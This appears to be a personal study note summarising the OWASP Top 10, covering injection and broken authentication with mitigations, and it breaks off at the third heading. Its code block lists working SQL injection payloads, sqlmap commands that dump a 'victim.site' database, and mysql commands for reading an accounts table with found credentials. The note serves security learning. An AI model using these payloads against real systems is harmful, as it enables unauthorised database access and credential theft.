# OWASP Top 10 (Open Web Application Security Project)

1. Injection
2. Broken Authentication
3. Sensitive Data Exposure
4. XML Ecternal Entity
5. Broken Access Control
6. Security Misconfiguration
7. Cross-site Scripting
8. Insecure Deserialization
9. Components with Known Vulnerabilities
10. Insufficient Logging & Monitoring

## 1. Injection

SQL Injection
* occurs when user controlled input is passed to SQL queries
* can pass in SQL queries to manipulate the outcome of queries
* access, modify, delete info in database

Command Injection
* occurs when user input is passed to system commands
* can execute arbitrary system commands (whoami, lsb_release, etc.)
* allow to gain access to users system

Mitigate
* use allow / whitelist = only accepted input is processed
* strip input = if input contains dangerous characters, they are removed before processing



```
Basic statement
> SELECT name, description FROM products WHERE id=9;

Comments done either with # or --

#10.124.211.96/newsdetails.php?id=26 or 2=2; -- -
#10.124.211.96/newsdetails.php?id=26 UNION SELECT 'null1'; -- -
#' or 1=1; -- -  | try this in login form


#SELECT description FROM items WHERE id=' ' UNION SELECT user (); -- -';


SQLMap -tool

#sqlmap -u <URL> -p <injection parameters> [options]
#sqlmap -u 'http://vitim.site/view.php?id=1141' -p id --technique=U 
	-uses UNION based SQLi

#sqlmap -u 'http://victim.site/view.php?id=1141' --tables
	-prints all the tables

#sqlmap -u 'http://victim.site/view.php?id=1141' --current-db <name> --columns
#sqlmap -u 'http://victim.site/view.php?id=1141' --current-db <name> --dump


-if you find credentials to test against SQL server
#mysql -u <username> -p<password> -h <ip>
#use <username>_accounts;
#show tables;
#select * from accounts;

```

## 2. Broken Authentication

Common flaws in authentication mechanisms
* brute force attacks
* use of weak credentials
* weak session cookies
  * if predictable values

Mitigate
* enforce strong password policy
* automatic lockout after X attempts
* Multi Factor Authentication
* sanitize the input(username & password) = can't create new user "<space>admin"


## 3. Sensitive Data Exposure

